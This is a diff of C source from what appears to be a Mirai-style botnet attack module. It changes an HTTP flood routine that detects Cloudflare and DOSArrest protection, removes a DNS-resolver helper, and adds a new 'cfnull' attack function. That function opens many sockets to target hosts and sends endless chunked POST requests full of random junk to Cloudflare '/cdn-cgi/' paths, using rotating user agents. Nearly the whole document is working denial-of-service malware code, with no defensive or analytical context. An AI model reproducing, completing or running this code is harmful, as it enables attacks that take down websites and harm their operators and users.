+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_8, NULL));
+                table_lock_val(TABLE_HTTP_8);
                 break;
             case 8:
-                table_unlock_val(TABLE_HTTP_NINE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_NINE, NULL));
-                table_lock_val(TABLE_HTTP_NINE);
+                table_unlock_val(TABLE_HTTP_9);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_9, NULL));
+                table_lock_val(TABLE_HTTP_9);
                 break;
             case 9:
-                table_unlock_val(TABLE_HTTP_TEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TEN, NULL));
-                table_lock_val(TABLE_HTTP_TEN);
+                table_unlock_val(TABLE_HTTP_10);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_10, NULL));
+                table_lock_val(TABLE_HTTP_10);
                 break;
             case 10:
-                table_unlock_val(TABLE_HTTP_ELEVEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ELEVEN, NULL));
-                table_lock_val(TABLE_HTTP_ELEVEN);
+                table_unlock_val(TABLE_HTTP_11);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_11, NULL));
+                table_lock_val(TABLE_HTTP_11);
                 break;
             case 11:
-                table_unlock_val(TABLE_HTTP_TWELVE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWELVE, NULL));
-                table_lock_val(TABLE_HTTP_TWELVE);
+                table_unlock_val(TABLE_HTTP_12);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_12, NULL));
+                table_lock_val(TABLE_HTTP_12);
                 break;
             case 12:
-                table_unlock_val(TABLE_HTTP_THIRTEEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTEEN, NULL));
-                table_lock_val(TABLE_HTTP_THIRTEEN);
+                table_unlock_val(TABLE_HTTP_13);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_13, NULL));
+                table_lock_val(TABLE_HTTP_13);
                 break;
             case 13:
-                table_unlock_val(TABLE_HTTP_FOURTEEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOURTEEN, NULL));
-                table_lock_val(TABLE_HTTP_FOURTEEN);
+                table_unlock_val(TABLE_HTTP_14);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_14, NULL));
+                table_lock_val(TABLE_HTTP_14);
                 break;
             case 14:
-                table_unlock_val(TABLE_HTTP_FIVETEEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVETEEN, NULL));
-                table_lock_val(TABLE_HTTP_FIVETEEN);
+                table_unlock_val(TABLE_HTTP_15);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_15, NULL));
+                table_lock_val(TABLE_HTTP_15);
                 break;
-            case 15:
-                table_unlock_val(TABLE_HTTP_SIXTEEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SIXTEEN, NULL));
-                table_lock_val(TABLE_HTTP_SIXTEEN);
-                break;
-            case 16:
-                table_unlock_val(TABLE_HTTP_SEVENTEEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SEVENTEEN, NULL));
-                table_lock_val(TABLE_HTTP_SEVENTEEN);
-                break;
-            case 17:
-                table_unlock_val(TABLE_HTTP_EIGHTEEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_EIGHTEEN, NULL));
-                table_lock_val(TABLE_HTTP_EIGHTEEN);
-                break;      
-            case 18:
-                table_unlock_val(TABLE_HTTP_NINETEEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_NINETEEN, NULL));
-                table_lock_val(TABLE_HTTP_NINETEEN);
-                break;   
-            case 19:
-                table_unlock_val(TABLE_HTTP_TWENTY);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY, NULL));
-                table_lock_val(TABLE_HTTP_TWENTY);
-                break;                                                                                                                                                                                                                                             
         }
 
         util_strcpy(http_table[i].path, path);
@@ -902,6 +305,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
 #ifdef DEBUG
                 if (sockets == 1)
                 {
+                    printf("sending buf: \"%s\"\n", buf);
                 }
 #endif
 
@@ -1001,9 +405,6 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                         continue;
 
                     generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;
-
-                    if (sockets == 1)
-                        printf("[http flood] headers: \"%s\"\n", generic_memes);
 
                     if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                         conn->protection_type = HTTP_PROT_CLOUDFLARE;
@@ -1218,12 +619,14 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                                 {
                                     ii++;
 
+                                    //yes its ugly, but i dont care
                                     if ((&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] == '"')
                                         (&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] = 0;
                                 }
 
                                 wait_time = util_atoi(loc_ptr, 10);
 
+                                //YOLO LOL
                                 while (wait_time > 0 && wait_time < 10 && fake_time + wait_time > time(NULL))
                                     sleep(1);
 
@@ -1232,7 +635,9 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
 
                                 if (util_stristr(loc_ptr, util_strlen(loc_ptr), "http") == 4)
                                 {
+                                    //this is an absolute url, domain name change maybe?
                                     ii = 7;
+                                    //http(s)
                                     if (loc_ptr[4] == 's')
                                         ii++;
 
@@ -1248,6 +653,9 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                                         ii++;
                                     }
 
+                                    // domain: loc_ptr;
+                                    // path: &(loc_ptr[ii + 1]);
+
                                     if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                         util_strcpy(conn->domain, loc_ptr);
 
@@ -1260,7 +668,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                                 }
                                 else if (loc_ptr[0] == '/')
                                 {
-
+                                    //handle relative url
                                     if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                     {
                                         util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
@@ -1270,12 +678,14 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                                 }
 
                                 strcpy(conn->method, "GET");
+                                // queue the state up for the next time
                                 conn->state = HTTP_CONN_QUEUE_RESTART;
                                 continue;
                             }
                         }
                     }
 
+                    // actually pull the content from the buffer that we processed via MSG_PEEK
                     processed = util_memsearch(generic_memes, ret, "\r\n\r\n", 4);
 
                     if (util_strcmp(conn->method, "POST") || util_strcmp(conn->method, "GET"))
@@ -1289,6 +699,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                 } else if (conn->state == HTTP_CONN_RECV_BODY) {
                     while (TRUE)
                     {
+                        // spooky doods changed state
                         if (conn->state != HTTP_CONN_RECV_BODY)
                         {
                             break;
@@ -1304,7 +715,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                         if (ret == 0)
                         {
                             errno = ECONNRESET;
-                            ret = -1;
+                            ret = -1; // Fall through to closing connection below
                         }
                         if (ret == -1)
                         {
@@ -1332,6 +743,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
 
                                 if (conn->protection_type == HTTP_PROT_DOSARREST)
                                 {
+                                    // we specifically want this to be case sensitive
                                     if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                     {
                                         int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
@@ -1381,6 +793,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                                         consumed = new_line_pos;
                                     }
                                 } else {
+                                    // get rid of any extra in the buf before we move on...
                                     conn->content_length = conn->rdbuf_pos - consumed;
                                     if (conn->content_length == 0)
                                     {
@@ -1411,7 +824,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                         if (ret == 0)
                         {
                             errno = ECONNRESET;
-                            ret = -1;
+                            ret = -1; // Fall through to closing connection below
                         }
                         if (ret == -1)
                         {
@@ -1429,72 +842,353 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
                 }
             }
         }
-
-#ifdef DEBUG
-        if (sockets == 1)
-        {
-            printf("debug mode sleep\n");
-            sleep(1);
-        }
-#endif
     }
 }
 
-
-static ipv4_t get_dns_resolver(void)
+void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int fd;
-    table_unlock_val(TABLE_ATK_RESOLVER);
-    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
-    table_lock_val(TABLE_ATK_RESOLVER);
-    if (fd >= 0)
+    int i, ii, rfd, ret = 0;
+    struct attack_cfnull_state *http_table = NULL;
+    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
+    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
+
+    char generic_memes[10241] = {0};
+
+    if (domain == NULL)
+        return;
+
+    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
+        return;
+
+    if (sockets > HTTP_CONNECTION_MAX)
+        sockets = HTTP_CONNECTION_MAX;
+
+    http_table = calloc(sockets, sizeof(struct attack_cfnull_state));
+
+    for (i = 0; i < sockets; i++)
     {
-        int ret, nspos;
-        char resolvbuf[2048];
-        ret = read(fd, resolvbuf, sizeof (resolvbuf));
-        close(fd);
-        table_unlock_val(TABLE_ATK_NSERV);
-        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
-        table_lock_val(TABLE_ATK_NSERV);
-        if (nspos != -1)
+        http_table[i].state = HTTP_CONN_INIT;
+        http_table[i].fd = -1;
+        http_table[i].dst_addr = targs[i % targs_len].addr;
+
+        util_strcpy(http_table[i].domain, domain);
+
+        if (targs[i % targs_len].netmask < 32)
+            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));
+
+        switch(rand_next() % 15)
         {
-            int i;
-            char ipbuf[32];
-            BOOL finished_whitespace = FALSE;
-            BOOL found = FALSE;
-            for (i = nspos; i < ret; i++)
-            {
-                char c = resolvbuf[i];
-                if (!finished_whitespace)
-                {
-                    if (c == ' ' || c == '\t')
-                        continue;
-                    else
-                        finished_whitespace = TRUE;
-                }
-                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
-                {
-                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
-                    ipbuf[i - nspos] = 0;
-                    found = TRUE;
-                    break;
-                }
-            }
-            if (found)
-            {
-                return inet_addr(ipbuf);
-            }
+            case 0:
+                table_unlock_val(TABLE_HTTP_1);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_1, NULL));
+                table_lock_val(TABLE_HTTP_1);
+                break;
+            case 1:
+                table_unlock_val(TABLE_HTTP_2);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_2, NULL));
+                table_lock_val(TABLE_HTTP_2);
+                break;
+            case 2:
+                table_unlock_val(TABLE_HTTP_3);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_3, NULL));
+                table_lock_val(TABLE_HTTP_3);
+                break;
+            case 3:
+                table_unlock_val(TABLE_HTTP_4);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_4, NULL));
+                table_lock_val(TABLE_HTTP_4);
+                break;
+            case 4:
+                table_unlock_val(TABLE_HTTP_5);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_5, NULL));
+                table_lock_val(TABLE_HTTP_5);
+                break;
+            case 5:
+                table_unlock_val(TABLE_HTTP_6);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_6, NULL));
+                table_lock_val(TABLE_HTTP_6);
+                break;
+            case 6:
+                table_unlock_val(TABLE_HTTP_7);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_7, NULL));
+                table_lock_val(TABLE_HTTP_7);
+                break;
+            case 7:
+                table_unlock_val(TABLE_HTTP_8);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_8, NULL));
+                table_lock_val(TABLE_HTTP_8);
+                break;
+            case 8:
+                table_unlock_val(TABLE_HTTP_9);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_9, NULL));
+                table_lock_val(TABLE_HTTP_9);
+                break;
+            case 9:
+                table_unlock_val(TABLE_HTTP_10);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_10, NULL));
+                table_lock_val(TABLE_HTTP_10);
+                break;
+            case 10:
+                table_unlock_val(TABLE_HTTP_11);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_11, NULL));
+                table_lock_val(TABLE_HTTP_11);
+                break;
+            case 11:
+                table_unlock_val(TABLE_HTTP_12);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_12, NULL));
+                table_lock_val(TABLE_HTTP_12);
+                break;
+            case 12:
+                table_unlock_val(TABLE_HTTP_13);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_13, NULL));
+                table_lock_val(TABLE_HTTP_13);
+                break;
+            case 13:
+                table_unlock_val(TABLE_HTTP_14);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_14, NULL));
+                table_lock_val(TABLE_HTTP_14);
+                break;
+            case 14:
+                table_unlock_val(TABLE_HTTP_15);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_15, NULL));
+                table_lock_val(TABLE_HTTP_15);
+                break;
         }
     }
-    switch (rand_next() % 4)
+
+    while(TRUE)
     {
-    case 0:
-        return INET_ADDR(8,8,8,8);
-    case 1:
-        return INET_ADDR(74,82,42,42);
-    case 2:
-        return INET_ADDR(64,6,64,6);
-    case 3:
-        return INET_ADDR(4,2,2,2);
+        fd_set fdset_rd, fdset_wr;
+        int mfd = 0, nfds;
+        struct timeval tim;
+        struct attack_cfnull_state *conn;
+        uint32_t fake_time = time(NULL);
+
+        FD_ZERO(&fdset_rd);
+        FD_ZERO(&fdset_wr);
+
+        for (i = 0; i < sockets; i++)
+        {
+            conn = &(http_table[i]);
+
+            if (conn->state == HTTP_CONN_RESTART)
+            {
+                conn->state = HTTP_CONN_INIT;
+            }
+
+            if (conn->state == HTTP_CONN_INIT)
+            {
+                struct sockaddr_in addr = {0};
+
+                if (conn->fd != -1)
+                    close(conn->fd);
+                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+                    continue;
+
+                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
+
+                ii = 65535;
+                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));
+
+                addr.sin_family = AF_INET;
+                addr.sin_addr.s_addr = conn->dst_addr;
+                addr.sin_port = htons(80);
+
+                conn->last_recv = fake_time;
+                conn->state = HTTP_CONN_CONNECTING;
+                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+
+                FD_SET(conn->fd, &fdset_wr);
+                if (conn->fd > mfd)
+                    mfd = conn->fd + 1;
+            }
+            else if (conn->state == HTTP_CONN_CONNECTING)
+            {
+                if (fake_time - conn->last_recv > 30)
+                {
+                    conn->state = HTTP_CONN_INIT;
+                    close(conn->fd);
+                    conn->fd = -1;
+                    continue;
+                }
+
+                FD_SET(conn->fd, &fdset_wr);
+                if (conn->fd > mfd)
+                    mfd = conn->fd + 1;
+            }
+            else if (conn->state == HTTP_CONN_SEND_HEADERS)
+            {
+
+                char buf[10240];
+                util_zero(buf, 10240);
+
+                util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/");
+                rand_alphastr(buf + util_strlen(buf), 16);
+                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
+                util_strcpy(buf + util_strlen(buf), conn->user_agent);
+                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
+                util_strcpy(buf + util_strlen(buf), conn->domain);
+                util_strcpy(buf + util_strlen(buf), "\r\n");
+
+                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
+                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
+                table_lock_val(TABLE_ATK_KEEP_ALIVE);
+                util_strcpy(buf + util_strlen(buf), "\r\n");
+
+                table_unlock_val(TABLE_ATK_ACCEPT);
+                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
+                table_lock_val(TABLE_ATK_ACCEPT);
+                util_strcpy(buf + util_strlen(buf), "\r\n");
+
+                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
+                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
+                table_lock_val(TABLE_ATK_ACCEPT_LNG);
+                util_strcpy(buf + util_strlen(buf), "\r\n");
+
+                table_unlock_val(TABLE_ATK_CONTENT_TYPE);
+                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
+                table_lock_val(TABLE_ATK_CONTENT_TYPE);
+                util_strcpy(buf + util_strlen(buf), "\r\n");
+
+                table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
+                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
+                table_lock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
+                util_strcpy(buf + util_strlen(buf), " ");
+                table_unlock_val(TABLE_ATK_CHUNKED);
+                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CHUNKED, NULL));
+                table_lock_val(TABLE_ATK_CHUNKED);
+                util_strcpy(buf + util_strlen(buf), "\r\n");
+
+                util_strcpy(buf + util_strlen(buf), "\r\n");
+
+                conn->to_send = (80 * 1024 * 1024);
+
+                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
+                conn->last_send = fake_time;
+
+                conn->state = HTTP_CONN_SEND_JUNK;
+                FD_SET(conn->fd, &fdset_wr);
+                FD_SET(conn->fd, &fdset_rd);
+                if (conn->fd > mfd)
+                    mfd = conn->fd + 1;
+            }
+            else if (conn->state == HTTP_CONN_SEND_JUNK)
+            {
+                int sent = 0;
+                char rndbuf[1025] = {0};
+                util_zero(rndbuf, 1025);
+                rand_alphastr(rndbuf, 1024);
+
+                if (conn->to_send <= 0)
+                {
+                    send(conn->fd, "0\r\n", 3, MSG_NOSIGNAL);
+                } else {
+                    // EZZZZZZZZZ HACKS
+                    if (conn->to_send < 1024)
+                        rndbuf[conn->to_send] = 0;
+
+                    if ((conn->to_send >= 1024 && (conn->to_send % 1024) == 0))
+                    {
+                        char szbuf[4] = {0};
+                        util_zero(szbuf, 4);
+                        util_itoa(1024, 16, szbuf);
+                        send(conn->fd, szbuf, util_strlen(szbuf), MSG_NOSIGNAL);
+                        send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+                    }
+
+                    if ((sent = send(conn->fd, rndbuf, util_strlen(rndbuf), MSG_NOSIGNAL)) == -1)
+                    {
+                        conn->state = HTTP_CONN_RESTART;
+                        continue;
+                    }
+
+                    // if our local send buffer is full, slow down. no need to rush (^:
+                    if (sent != util_strlen(rndbuf))
+                    {
+                        conn->state = HTTP_CONN_SNDBUF_WAIT;
+                    }
+
+                    conn->to_send -= sent;
+                    FD_SET(conn->fd, &fdset_wr);
+                }
+
+                conn->last_send = fake_time;
+                FD_SET(conn->fd, &fdset_rd);
+                if (conn->fd > mfd)
+                    mfd = conn->fd + 1;
+            }
+            else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
+            {
+                FD_SET(conn->fd, &fdset_wr);
+                if (conn->fd > mfd)
+                    mfd = conn->fd + 1;
+            }
+            else
+            {
+                // NEW STATE WHO DIS
+                conn->state = HTTP_CONN_INIT;
+                close(conn->fd);
+                conn->fd = -1;
+            }
+        }
+
+        if (mfd == 0)
+            continue;
+
+        tim.tv_usec = 0;
+        tim.tv_sec = 1;
+        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
+        fake_time = time(NULL);
+
+        if (nfds < 1)
+            continue;
+
+        for (i = 0; i < sockets; i++)
+        {
+            conn = &(http_table[i]);
+
+            if (conn->fd == -1)
+                continue;
+
+            if (FD_ISSET(conn->fd, &fdset_wr))
+            {
+                if (conn->state == HTTP_CONN_CONNECTING)
+                {
+                    int err = 0;
+                    socklen_t err_len = sizeof (err);
+
+                    ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
+                    if (err == 0 && ret == 0)
+                    {
+
+                        conn->state = HTTP_CONN_SEND;
+                    }
+                    else
+                    {
+
+                        close(conn->fd);
+                        conn->fd = -1;
+                        conn->state = HTTP_CONN_INIT;
+                        continue;
+                    }
+                }
+                else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
+                {
+                    conn->state = HTTP_CONN_SEND_JUNK;
+                }
+            }
+
+            if (FD_ISSET(conn->fd, &fdset_rd))
+            {
+                // if we get any sort of headers or error code then punt it.
+                // we really dont care about any content we get
+                conn->state = HTTP_CONN_RESTART;
+            }
+        }
+
+        // handle any sockets that didnt return from select here
+        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
+
     }
 }
+
